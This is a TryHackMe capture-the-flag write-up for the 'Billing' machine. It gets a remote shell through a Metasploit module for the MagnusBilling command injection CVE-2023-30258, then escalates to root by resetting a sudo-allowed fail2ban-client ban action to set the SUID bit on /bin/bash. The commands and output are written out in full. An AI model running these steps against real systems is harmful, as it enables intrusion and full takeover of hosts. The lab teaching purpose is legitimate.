# Billing - TryHackMe Writeup

**Difficulty:** Easy  
**TL;DR:** unauthenticated RCE (CVE-2023-30258) → asterisk shell → Privilege Escalation via Fail2Ban
---------------------------
## Target
- Machine: `Billing`  
- Date: `2025-10-6`  
- Environment: TryHackMe / CTF
---------------------------

## Steps 
Initial scan:

```bash
└─$ nmap -sV -sC -Pn -T4 billing.thm

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 49:26:bc:36:00:a8:c7:4d:be:74:1e:21:80:5c:62:f6 (ECDSA)
|_  256 44:16:61:d0:3c:30:ab:1c:fa:61:1a:33:a4:11:40:5a (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://billing.thm/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
5038/tcp open  asterisk Asterisk Call Manager 2.10.6

```
----------------------

Vulnerability Discovery:

from `| http-title:             MagnusBilling        `

About this service : 
MagnusBilling Open-Source Billing System uses ExtJS, Yii Framework and Asterisk as main the technologies to write a free billing system.

We can see the version of `MagnusBilling` from `http://billing.thm/mbilling/README.md`
it's  `7.x.x`

### CVE-2023-30258

`CVE-2023-30258` :
**Command Injection vulnerability in MagnusSolution magnusbilling 6.x and 7.x allows remote attackers to run arbitrary commands via unauthenticated HTTP request.**

----------------------------

### Exploit and get shell:
I used MetaSploit to exploit 
```bash
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST billing.thm
RHOST => billing.thm
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST [YOUR_IP]
LHOST => [TOUR_IP]
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run

[+] The target is vulnerable. Successfully tested command injection.

meterpreter > shell
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
python3 -c 'import pty;pty.spawn("/bin/bash")'
asterisk@billing.thm:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
export TERM=xterm
```

## user.txt
 
Retrieve the user flag from `/home/magnus/user.txt`
```bash
asterisk@billing.thm:/home/magnus$ cat user.txt 
THM{[REDACTED]}
```
## root.txt
Time to Privilege Escalation
```bash
asterisk@billing.thm:/home/magnus$ sudo -l
Matching Defaults entries for asterisk on billing.thm:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on billing.thm:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

About this service 

`Fail2Ban` is an intrusion prevention software framework. Written in the Python programming language, it is designed to prevent brute-force attacks.
And the `fail2ban-client` command-line utility used to interact with and control the Fail2Ban server.
The `fail2ban-client` command allows administrators to perform various actions

### Privilege Escalation via Fail2Ban Misconfiguration

1.Modified the Fail2Ban actionban command for the asterisk-iptables jail:
```bash
asterisk@billing.thm:/tmp$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
asterisk@billing.thm:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 18  2025 /bin/bash
```
This changed the ban action to set the SUID bit on `/bin/bash` instead of blocking IPs.

2.Then executed a ban command to trigger the modified action:
```
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.1.1.1
asterisk@billing.thm:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
```
3.Launched bash with preserved privileges and get root flag:
```
asterisk@billing.thm:/tmp$ bash -p
bash-5.2# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
bash-5.2# cat /root/root.txt 
THM{[REDACTED]}
```
